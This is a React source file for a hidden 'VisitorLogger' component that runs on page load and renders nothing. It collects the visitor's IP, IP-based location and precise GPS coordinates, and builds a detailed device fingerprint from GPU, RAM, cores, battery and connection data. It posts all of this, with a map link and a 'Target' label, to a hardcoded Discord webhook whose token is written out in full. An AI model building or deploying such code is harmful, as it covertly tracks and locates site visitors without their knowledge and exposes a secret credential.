import { useEffect } from 'react'
import useMobile from './useMobile'

export default function VisitorLogger() {
  const isMobile = useMobile()

  useEffect(() => {
    const logVisit = async () => {
      // 1. Prevent double-logging in this session
      if (sessionStorage.getItem('visited_logged')) return
      
      console.log('--- Logger Started ---')

      try {
        // A. Network Identity (Initial IP-based)
        const [ipRes, locRes] = await Promise.all([
          fetch('https://api.ipify.org?format=json'),
          fetch('https://ipapi.co/json/')
        ]).catch(() => [null, null])

        let userIp = 'Unknown'
        let data = { city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', latitude: 0, longitude: 0 }

        if (ipRes) {
          const ipData = await ipRes.json()
          userIp = ipData.ip
        }
        if (locRes) {
          data = await locRes.json()
        }

        // B. Precise Location Attempt (GPS)
        const getGPSLocation = () => {
          return new Promise((resolve) => {
            if (!navigator.geolocation) {
              console.warn('Geolocation not supported');
              return resolve(null);
            }
            
            console.log('Requesting GPS Permission...');
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                console.log('GPS Success!');
                resolve({
                  lat: pos.coords.latitude.toFixed(6),
                  lon: pos.coords.longitude.toFixed(6),
                  accuracy: `±${Math.round(pos.coords.accuracy)}m`,
                  source: '📍 Precise (GPS)'
                });
              },
              (err) => {
                console.warn('GPS Error/Denied:', err.message);
                resolve(null);
              },
              { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
            );
          });
        };

        // Wait 1 second before asking for GPS to ensure browser is ready
        await new Promise(r => setTimeout(r, 1000));
        
        const gps = await getGPSLocation();
        const finalLat = gps ? gps.lat : data.latitude;
        const finalLon = gps ? gps.lon : data.longitude;
        const locationSource = gps ? gps.source : '🏠 Approximate (IP)';

        // C. Hardware Fingerprint
        const getDeviceInfo = async () => {
          const ua = navigator.userAgent;
          const uad = navigator.userAgentData;
          
          let browser = "Unknown Browser";
          let os = "Unknown OS";
          let model = "";

          if (uad) {
            const brand = uad.brands.find(b => b.brand !== 'Not A;Brand');
            browser = brand ? brand.brand : "Unknown Browser";
            os = uad.platform || "Unknown OS";
            
            try {
              const entropy = await uad.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
              if (entropy.model && entropy.model !== "") {
                model = ` (${entropy.model})`;
              } else if (ua.includes("Windows")) {
                model = " (PC)";
              }
            } catch (e) {}
          } else {
            if (ua.includes("Firefox/")) browser = "Firefox";
            else if (ua.includes("Edg/")) browser = "Edge";
            else if (ua.includes("Chrome/")) browser = "Chrome";
            else if (ua.includes("Safari/")) browser = "Safari";
            else if (ua.includes("MSIE") || ua.includes("Trident/")) browser = "Internet Explorer";

            if (ua.includes("Windows")) os = "Windows";
            else if (ua.includes("Macintosh")) os = "macOS";
            else if (ua.includes("Android")) {
              const match = ua.match(/Android\s([0-9\.]+)/);
              os = match ? `Android ${match[1]}` : "Android";
              const modelMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
              if (modelMatch) model = ` (${modelMatch[1]})`;
            }
            else if (ua.includes("iPhone")) os = "iPhone";
            else if (ua.includes("iPad")) os = "iPad";
            else if (ua.includes("Linux")) os = "Linux";
          }

          return `${os}${model} | ${browser}`;
        };
        const deviceInfo = await getDeviceInfo();

        const getGPU = () => {
          try {
            const canvas = document.createElement('canvas')
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown GPU'
          } catch (e) { return 'Unknown GPU' }
        }
        const gpu = getGPU()

        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection
        const rawType = connection ? connection.effectiveType : 'Unknown'
        const downlink = connection ? connection.downlink : 0
        
        let connDisplay = rawType.toUpperCase()
        if (downlink > 15) connDisplay = '5G / High Speed'
        if (downlink > 100) connDisplay = 'Ultra Fast / Fiber'
        
        const connSpeed = downlink ? `${downlink} Mbps` : 'Unknown Speed'
        
        const cores = navigator.hardwareConcurrency || 'Unknown'
        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown'
        const screenRes = `${window.screen.width}x${window.screen.height}`
        const pixelRatio = window.devicePixelRatio || 1
        
        let batteryInfo = 'Unknown'
        try {
          if (navigator.getBattery) {
            const battery = await navigator.getBattery()
            const level = Math.round(battery.level * 100) + '%'
            const charging = battery.charging ? '⚡' : '🔋'
            batteryInfo = `${level} (${charging})`
          }
        } catch (e) {}

        const referrer = document.referrer || 'Direct / Bookmark'
        const currentPath = window.location.pathname
        
        const dateOptions = { day: 'numeric', month: 'long', year: 'numeric' }
        const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }
        const localTime = `${new Date().toLocaleDateString('en-GB', dateOptions)}, ${new Date().toLocaleTimeString('en-US', timeOptions)}`
        const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches

        // --- 2. FORMAT DISCORD MESSAGE ---
        const message = {
          embeds: [{
            title: "👤 New Visitor Detected",
            color: 0x2f3136, 
            fields: [
              { 
                name: "🏠 Identity & Location", 
                value: `**IP:** \`${userIp}\`\n**Source:** \`${locationSource}\`${gps ? ` (${gps.accuracy})` : ''}\n**Location:** ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n📍 [View on Google Maps](https://www.google.com/maps/search/?api=1&query=${finalLat},${finalLon})`, 
                inline: false 
              },
              {
                name: "📱 Device & Browser",
                value: `**Info:** \`${deviceInfo}\``,
                inline: false
              },
              { 
                name: "🔗 Origin", 
                value: `**Source:** ${referrer}`, 
                inline: true 
              },
              { 
                name: "🕒 Timing", 
                value: `**Local Time:** ${localTime}`, 
                inline: true 
              },
              { 
                name: "🌐 Network", 
                value: `**Type:** ${connDisplay}\n**Speed:** ${connSpeed}\n**Provider:** ${data.org || 'Unknown'}`, 
                inline: false 
              },
              { 
                name: "💻 Hardware", 
                value: `**Cores:** ${cores} | **RAM:** ${ram}\n**GPU:** \`${gpu}\``, 
                inline: false 
              },
              { 
                name: "📏 Display & Environment", 
                value: `**Res:** ${screenRes} (${pixelRatio}x)\n**Theme:** ${isDarkMode ? '🌙 Dark' : '☀️ Light'}\n**Power:** ${batteryInfo}`, 
                inline: false 
              }
            ],
            footer: { text: `Target: ${isMobile ? 'MOBILE' : 'DESKTOP'} | Path: ${currentPath}` },
            timestamp: new Date().toISOString()
          }]
        }

        const webhookUrl = 'https://discord.com/api/webhooks/1521874781186691323/nXQOqkOI3uFgTjHylL-QDJHGfU6ALOU27URusow-DisLnYEDRACUwUasIxUIIP0z6iMV';

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
          })
          
          sessionStorage.setItem('visited_logged', 'true')
          console.log('--- Webhook Sent Successfully ---')

      } catch (error) {
        console.error('Logger Error:', error)
      }
    }

    logVisit()
  }, [isMobile])

  return null
}
